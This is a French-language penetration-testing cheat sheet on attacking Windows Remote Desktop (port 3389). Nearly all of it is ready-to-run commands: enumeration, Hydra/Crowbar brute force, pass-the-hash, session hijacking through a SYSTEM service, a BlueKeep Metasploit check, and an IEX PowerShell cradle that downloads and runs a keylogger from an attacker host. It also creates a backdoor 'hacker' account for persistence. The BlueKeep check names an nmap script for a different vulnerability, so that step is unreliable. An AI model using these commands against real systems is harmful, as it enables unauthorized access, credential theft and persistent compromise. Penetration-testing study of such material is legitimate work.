# RDP (3389/TCP)

Remote Desktop Protocol permet l'accès à distance à l'interface graphique de systèmes Windows.

## 🔍 Énumération

### Scan de base
```bash
# Vérifier si RDP est actif
nmap -p 3389 $IP

# Scanner avec scripts Nmap
nmap --script "rdp-*" -p 3389 $IP

# Récupérer les informations de version
nmap -sV -p 3389 $IP
```

### Identification du service
```bash
# Vérifier la bannière
nxc rdp $IP

# Vérifier le certificat RDP
openssl s_client -connect $IP:3389
```

## 🔨 Exploitation

### Attaque par force brute
```bash
# Avec Hydra
hydra -L users.txt -P passwords.txt $IP rdp

# Avec Crowbar (meilleure gestion des blocages)
crowbar -b rdp -s $IP/32 -U users.txt -C passwords.txt

# Avec Netexec
nxc rdp $IP -u usernames.txt -p passwords.txt
```

### RDP Pass-the-Hash
```bash
# Nécessite que Restricted Admin Mode soit activé sur la cible
xfreerdp /v:$IP /u:Administrator /pth:HASH_NT

# Alternative avec Netexec pour tester
nxc rdp $IP -u Administrator -H HASH_NT
```

### Détournement de session (Session Hijacking)
```bash
# Lister les sessions actives
query user

# Activer Restricted Admin Mode si nécessaire (sur la cible)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Créer un service pour le détournement (nécessite SYSTEM)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
net start sessionhijack
```

### BlueKeep (CVE-2019-0708)
```bash
# Vérifier la vulnérabilité
nmap --script rdp-vuln-ms12-020 -p 3389 $IP

# Avec Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $IP
run
```

## 🔐 Post-exploitation

### Transfert de fichiers via RDP
```bash
# Monter un dossier local avec rdesktop
rdesktop $IP -d DOMAIN -u USERNAME -p PASSWORD -r disk:share=/path/to/local/folder

# Monter un dossier local avec xfreerdp
xfreerdp /v:$IP /d:DOMAIN /u:USERNAME /p:PASSWORD /drive:share,/path/to/local/folder

# Accéder aux fichiers montés depuis la session RDP
\\tsclient\share\
```

### Capture d'identifiants
```bash
# Installer un keylogger sur la cible
# Exemple avec PowerShell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://VOTRE_IP/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath C:\temp\keylog.txt"
```

### Persistance
```bash
# Créer un utilisateur local et l'ajouter au groupe RDP
net user hacker P@ssw0rd! /add
net localgroup "Remote Desktop Users" hacker /add
```

## ⚠️ Erreurs courantes & astuces
- RDP peut être configuré sur un port non standard
- Windows peut bloquer les comptes après plusieurs échecs d'authentification
- Le Pass-the-Hash ne fonctionne que si Restricted Admin Mode est activé
- Les sessions multiples peuvent être désactivées par GPO
- Le détournement de session ne fonctionne plus sur les versions récentes (Server 2019+)